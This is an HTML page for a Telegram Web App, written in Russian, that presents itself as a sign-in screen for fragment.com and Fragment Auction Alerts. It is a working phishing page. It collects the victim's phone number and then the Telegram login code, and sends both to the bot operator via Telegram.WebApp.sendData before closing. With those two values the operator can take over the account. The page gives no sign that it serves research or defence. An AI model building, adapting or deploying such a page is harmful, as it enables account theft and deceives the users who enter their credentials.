<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Fragment - вход</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        input, button { padding: 10px; margin: 5px; }
        button { background: #0088cc; color: white; border: none; }
    </style>
</head>
<body>
    <h1>Войдите, чтобы использовать аккаунт Telegram</h1>
    <p>для fragment.com и Fragment Auction Alerts.</p>
    <p>Введите свой <b>номер телефона</b> в международном формате.</p>
    
    <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
    <button onclick="sendPhone()">Далее</button>
    
    <div id="codeSection" style="display:none; margin-top:20px;">
        <p>Введите код из Telegram:</p>
        <input type="text" id="code" placeholder="12345">
        <button onclick="sendCode()">Подтвердить</button>
    </div>
    
    <script>
    function sendPhone() {
        const phone = document.getElementById('phone').value;
        
        if (phone && window.Telegram && Telegram.WebApp) {
            // Отправляем номер
            Telegram.WebApp.sendData(JSON.stringify({
                phone: phone,
                code: ''
            }));
            
            // Показываем поле для кода
            document.getElementById('codeSection').style.display = 'block';
        } else {
            alert('Введите номер телефона!');
        }
    }
    
    function sendCode() {
        const phone = document.getElementById('phone').value;
        const code = document.getElementById('code').value;
        
        if (code && window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.sendData(JSON.stringify({
                phone: phone,
                code: code
            }));
            
            // Закрываем WebApp
            setTimeout(() => {
                Telegram.WebApp.close();
            }, 1000);
        }
    }
    
    // Автоотправка при загрузке
    if (window.Telegram && Telegram.WebApp) {
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
    }
    </script>
</body>
</html>
